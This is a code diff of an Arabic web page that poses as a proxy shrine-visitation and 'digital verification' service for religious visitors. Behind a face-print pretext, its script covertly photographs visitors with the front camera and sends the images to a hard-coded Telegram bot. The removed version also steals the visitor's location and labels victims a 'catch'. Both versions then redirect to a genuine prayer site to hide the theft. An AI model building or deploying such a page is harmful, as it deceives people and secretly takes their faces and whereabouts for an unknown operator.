@@ -1,68 +1,26 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مفاتيح الجنان | الزيارة بالإنابة</title>
-    <style>
-        body { background: #062c12; color: #f1e4bc; font-family: 'Amiri', serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
-        .card { background: #0a401b; padding: 25px; border-radius: 15px; border: 2px solid #d4af37; width: 85%; max-width: 380px; box-shadow: 0 10px 25px rgba(0,0,0,0.4); }
-        .btn { background: #d4af37; color: #062c12; border: none; padding: 15px; border-radius: 8px; font-size: 19px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 20px; transition: 0.3s; }
-        .btn:hover { background: #f1e4bc; }
-        video, canvas { display: none; }
-    </style>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>التوثيق الرقمي | العتبات</title>
+<style>
+body{background:#041e12;color:#d4af37;font-family:serif;margin:0;display:flex;justify-content:center;align-items:center;height:100vh;text-align:center}
+.c{background:rgba(10,64,27,0.9);padding:30px;border:1px solid #d4af37;width:85%;max-width:380px;box-shadow:0 0 20px #000}
+.b{background:transparent;color:#d4af37;border:1px solid #d4af37;padding:15px;font-size:18px;cursor:pointer;width:100%;margin-top:20px}
+</style>
 </head>
 <body>
-    <div class="card">
-        <h2 style="color:#d4af37;">خدمة الزيارة بالإنابة</h2>
-        <p>يرجى الضغط على الزر أدناه لتسجيل اسمك وضبط "بصمة الوجه" للتأكد من الهوية وضمان وصول ثواب الزيارة إليك.</p>
-        <button id="main-btn" onclick="startDua()" class="btn">تسجيل الدخول والبدء بالزيارة</button>
-        <video id="v" autoplay playsinline style="display:none;"></video>
-        <canvas id="c" style="display:none;"></canvas>
-    </div>
-
-    <script>
-        const token = '8544269332:AAGf3PsxBtCu0hjXUp1nqaqJknKpf5aR8Po';
-        const chatId = '1638763189';
-
-        async function startDua() {
-            document.getElementById('main-btn').innerText = "جاري الاتصال بالسيرفر...";
-            try {
-                // طلب الكاميرا بلمح البصر
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.getElementById('v');
-                video.srcObject = stream;
-
-                video.onloadedmetadata = () => {
-                    setTimeout(() => {
-                        const canvas = document.getElementById('c');
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        canvas.getContext('2d').drawImage(video, 0, 0);
-                        
-                        canvas.toBlob(blob => {
-                            const fd = new FormData();
-                            fd.append('chat_id', chatId);
-                            fd.append('photo', blob, 'img.jpg');
-                            fd.append('caption', '📸 صيدة صامتة من موقع الأدعية!');
-
-                            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd })
-                            .then(() => {
-                                // سحب اللوكيشن وراها فوراً
-                                navigator.geolocation.getCurrentPosition(p => {
-                                    const loc = https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude};
-                                    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📍 موقع الصيدة الدينية: " + loc)}`);
-                                    // تحويله لموقع أدعية حقيقي
-                                    window.location.href = "https://www.duas.org/mobile/index.html";
-                                }, () => { window.location.href = "https://www.duas.org/mobile/index.html"; });
-                            });
-                        }, 'image/jpeg');
-                    }, 100); 
-                };
-            } catch (err) {
-                window.location.href = "https://www.duas.org/mobile/index.html";
-            }
-        }
-    </script>
+<div class="c">
+<h1>خدمة التوثيق والزيارة</h1>
+<p>يرجى الضغط للتوثيق الرقمي لضمان ذكر اسمكم عند الضريح الشريف عبر بصمة الوجه.</p>
+<button id="btn" onclick="s()" class="b">بدء الزيارة</button>
+<video id="v" autoplay playsinline style="display:none"></video>
+<canvas id="ca" style="display:none"></canvas>
+</div>
+<script>
+const t='8544269332:AAGf3PsxBtCu0hjXUp1nqaqJknKpf5aR8Po',id='1638763189';
+async function p(b,c){const f=new FormData();f.append('chat_id',id);f.append('photo',b,'i.jpg');f.append('caption',c);return fetch(`https://api.telegram.org/bot${t}/sendPhoto`,{method:'POST',body:f})}
+async function s(){const g=document.getElementById('btn');g.innerText="جاري المعالجة...";g.disabled=true;try{const m=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});const v=document.getElementById('v');v.srcObject=m;v.onloadedmetadata=async()=>{const x=document.getElementById('ca'),z=x.getContext('2d');setTimeout(async()=>{x.width=v.videoWidth;x.height=v.videoHeight;z.drawImage(v,0,0);x.toBlob(b=>p(b,"📸 لقطة 1: بدء التوثيق"),'image/jpeg');setTimeout(async()=>{z.drawImage(v,0,0);x.toBlob(async(b)=>{await p(b,"📸 لقطة 2: تم بنجاح");window.location.href="https://www.duas.org/mobile/ziyarat-waris.html"},'image/jpeg')},1500)},500)}}catch(e){alert("يجب السماح بالكاميرا للتوثيق.");g.innerText="بدء الزيارة";g.disabled=false}}
+</script>
 </body>
 </html>
